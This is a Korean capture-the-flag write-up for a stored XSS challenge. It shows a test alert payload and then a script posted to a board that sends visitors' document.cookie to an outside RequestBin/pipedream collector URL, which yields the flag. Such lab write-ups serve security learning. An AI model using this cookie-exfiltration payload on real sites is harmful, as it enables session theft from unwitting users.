# XSS 1

http://ctf.segfaulthub.com:4343/xss_1/

위 사이트의 메인페이지   
![1](https://user-images.githubusercontent.com/106296883/236489802-ad777541-b520-437e-8100-5da8baf0fedb.PNG)
</br>
</br>

Login 진행   
![2](https://user-images.githubusercontent.com/106296883/236489806-a60af02f-ec84-4e73-bafa-fddfaaf37665.PNG)
</br>
</br>

Sign up 진행   
![3](https://user-images.githubusercontent.com/106296883/236489809-c3f2d3fc-a572-4482-bd1c-d80abfb5cce2.PNG)
</br>
</br>

Sign up 완료 후 Login 진행   
![4](https://user-images.githubusercontent.com/106296883/236489810-f1b06ed8-9637-4d08-afeb-258fa0a7bd6b.PNG)
</br>
</br>

로그인 완료   
![5](https://user-images.githubusercontent.com/106296883/236489814-04d25626-a4dc-401b-9f50-13525204fa74.PNG)
</br>
</br>

공지 사항 버튼 클릭   
![6](https://user-images.githubusercontent.com/106296883/236489816-6fc9c820-104b-40af-ae98-2e30dedc2100.PNG)
</br>
</br>

글쓰기 버튼 클릭 후 POC 코드 삽입   
```
<script>alert('test')</script>
```
![7](https://user-images.githubusercontent.com/106296883/236489821-ed9a9077-7917-4dab-8bf0-77238eb9d622.PNG)
</br>
</br>

내가 작성한 게시글 클릭   
![8](https://user-images.githubusercontent.com/106296883/236489822-b39f26c1-3d40-4e46-adc5-ed192e119eca.PNG)
</br>
</br>

POC 코드 성공. alert 통과 

제목 POST를 통해 입력가능하다는 것을 확인했음   
![9](https://user-images.githubusercontent.com/106296883/236489827-4f0ab82b-fef6-4d6e-a645-1d12b8efd745.PNG)
</br>
</br>

RequestBin.com에서 임시 url을 받아 사용   
![11](https://user-images.githubusercontent.com/106296883/236489829-0384bee1-231a-40ab-9389-eb861c23d68f.PNG)
</br>
</br>

cookie 탈취 코드 입력 후 작성
```
<script>var i = new Image();i.src = "https://en1400lt9tp98.x.pipedream.net?cookie=" + document.cookie;</script>
```
![10](https://user-images.githubusercontent.com/106296883/236489832-7fde9473-b69a-4b7a-86e7-a6c6a5a533a6.PNG)
</br>
</br>

cookie 탈취 코드를 작성한 게시글을 클릭하여 게시글 확인을 진행

RequestBin.com에서 cookie에 대한 정보가 적용되는 것을 확인.   
![13](https://user-images.githubusercontent.com/106296883/236489833-8a054378-41ac-488c-a735-9eb50486bc66.PNG)
</br>
</br>

실제 진행할 때에는 flag 획득 성공
</br>
</br>

